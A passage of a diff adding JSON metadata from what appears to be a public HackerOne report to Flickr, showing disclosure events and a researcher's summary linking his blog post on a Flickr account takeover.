+        "verified": true,
+        "url": "/lauritz",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/g4U1xdatWYGm57xcNJJw4v4W/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "flickr"
+    },
+    {
+      "id": 14722388,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "Disclosing",
+      "automated_response": false,
+      "created_at": "2021-12-18T00:35:49.323Z",
+      "updated_at": "2021-12-18T00:35:49.323Z",
+      "actor": {
+        "username": "alexseville",
+        "cleared": false,
+        "verified": false,
+        "url": "/alexseville",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/351/175/abf065d617153e751322bb0666372a703102d6b9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "flickr"
+    },
+    {
+      "id": 14722389,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-12-18T00:35:49.642Z",
+      "updated_at": "2021-12-18T00:35:49.642Z",
+      "actor": {
+        "username": "alexseville",
+        "cleared": false,
+        "verified": false,
+        "url": "/alexseville",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/351/175/abf065d617153e751322bb0666372a703102d6b9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "flickr"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 116534,
+      "category": "researcher",
+      "content": "I published a deep dive into this vulnerability in a blog post: https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/\n\nThank you very much to @alexseville and team for the kind triage, kudos for applying a preliminary fix on the day of reporting! :)\n\nIf you have any comments or questions, feel free to reach out via Twitter: https://twitter.com/_lauritz_",
+      "user": {
+        "id": 225466,
+        "username": "lauritz",
+        "name": "Lauritz Holtmann",
+        "bio": "",
+        "cleared": false,
+        "verified": true,
+        "website": "https://security.lauritz-holtmann.de",
+        "location": "",
+        "created_at": "2017-12-18T00:03:45.133Z",
+        "url": "https://hackerone.com/lauritz",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/g4U1xdatWYGm57xcNJJw4v4W/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/g4U1xdatWYGm57xcNJJw4v4W/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/g4U1xdatWYGm57xcNJJw4v4W/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [
+
+      ]
+    }
+  ]
+}
